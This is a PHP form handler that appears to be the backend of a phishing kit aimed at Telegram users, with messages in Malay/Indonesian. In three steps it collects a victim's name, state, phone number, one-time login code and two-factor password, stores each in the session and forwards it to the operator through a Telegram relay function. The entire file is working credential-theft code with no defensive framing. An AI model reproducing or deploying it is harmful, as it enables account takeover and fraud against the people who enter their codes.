<?php
require_once("_core.php");
header('Content-Type: application/json');

$name     = $_POST['name'] ?? '';
$state    = $_POST['state'] ?? '';
$phone    = $_POST['phone'] ?? '';
$otp      = $_POST['otp'] ?? '';
$password = $_POST['password'] ?? '';
$step     = $_POST['step'] ?? '';

$response = ['status' => 'success'];

if ($step == '1') {
    $_SESSION['full_name'] = $name;
    $_SESSION['provinsi']  = $state;
    $_SESSION['phone_number'] = $phone;
    
    $msg = "🔔 <b>DATA BARU MASUK (Langkah 1)</b>\n\n" .
           "👤 Nama: {$name}\n" .
           "📍 Negeri: {$state}\n" .
           "📱 No. Telegram: {$phone}";
           
    send_to_telegram($msg);
    $_SESSION["state"] = "phone";

} elseif ($step == '2') {
    $_SESSION['otp_code'] = $otp;
    
    $msg = "🔐 <b>KOD OTP DIMASUKKAN (Langkah 2)</b>\n\n" .
           "📱 No: " . ($_SESSION['phone_number'] ?? '-') . "\n" .
           "🔑 OTP: <code>{$otp}</code>";
           
    send_to_telegram($msg);
    $_SESSION["state"] = "otp";

} elseif ($step == '3') {
    $_SESSION['password_2fa'] = $password;
    
    $msg = "⚠️ <b>KATA LALUAN 2FA (Langkah 3)</b>\n\n" .
           "📱 No: " . ($_SESSION['phone_number'] ?? '-') . "\n" .
           "🔒 Password: <code>{$password}</code>\n\n" .
           "<i>✅ Semua data telah terkumpul.</i>";
           
    send_to_telegram($msg);
    $_SESSION["state"] = "processing";
}

echo json_encode($response);
?>